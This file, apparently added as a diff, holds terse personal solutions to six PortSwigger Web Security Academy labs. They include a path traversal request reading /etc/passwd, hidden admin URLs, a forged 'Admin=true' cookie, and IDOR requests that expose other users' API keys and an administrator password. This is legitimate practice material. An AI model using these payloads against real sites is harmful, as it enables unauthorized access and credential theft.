@@ -1,0 +1,102 @@
+1) Lab: File path traversal, simple case
+
+<img src="/image?filename=24.jpg">
+
+->
+
+<img src="/image?filename=../../../etc/passwd">
+
+->
+
+https://0a60000703dbceee825c1ac400ea004c.web-security-academy.net/image?filename=../../../etc/passwd
+
+2) Lab: Unprotected admin functionality
+
+https://0aed006c049c080e8104e37100ce009a.web-security-academy.net/robots.txt
+
+->
+
+User-agent: *
+Disallow: /administrator-panel
+
+3) Lab: Unprotected admin functionality with unpredictable URL
+
+adminPanelTag.setAttribute('href', '/admin-qpr8d5');
+
+->
+
+https://0aa3002503cda2a182fa426f00cc009d.web-security-academy.net/admin-qpr8d5
+
+4) Lab: User role controlled by request parameter
+
+Login as - wiener:peter
+
+->
+
+GET /admin HTTP/2
+Host: 0a6200bb0373fc6581ec11b30082000d.web-security-academy.net
+Cookie: Admin=true; session=pIwACZDRPZKlRGsp3qjQhAq8zNBMO6wx
+
+->
+
+https://0a6200bb0373fc6581ec11b30082000d.web-security-academy.net/admin
+
+5) Lab: User ID controlled by request parameter, with unpredictable user IDs
+
+Login as - wiener:peter
+
+->
+
+Your username is: wiener
+Your API Key is: 2iT2gidhvid7UQOIlXNdzO9sHt1IbjZZ
+
+->
+
+<a href='/blogs?userId=d399567c-c5a6-42cc-a6d4-d433229202c3'>carlos</a>
+
+->
+
+<a href="/my-account?id=24fbdc75-000c-450e-8bdf-2866b052fbae">My account</a>
+
+->
+
+<a href="/my-account?id=d399567c-c5a6-42cc-a6d4-d433229202c3">My account</a>
+
+->
+
+Your username is: carlos
+Your API Key is: OlOWuazlGNoDRMWe22xNMKfPjt4wAhOt
+
+6) Lab: User ID controlled by request parameter with password disclosure
+
+Login as - wiener:peter
+
+->
+
+https://0af2004103638a2c81b6f8d500f500c2.web-security-academy.net/my-account?id=wiener
+
+->
+
+GET /my-account?id=administrator HTTP/2
+Host: 0af2004103638a2c81b6f8d500f500c2.web-security-academy.net
+Cookie: session=KSClZTjCJI5TmPliGfZdekJh1MadyhbA
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0af2004103638a2c81b6f8d500f500c2.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+->
+
+<input required type=password name=password value='wniux3m00tda2vxcss1h'/>
+
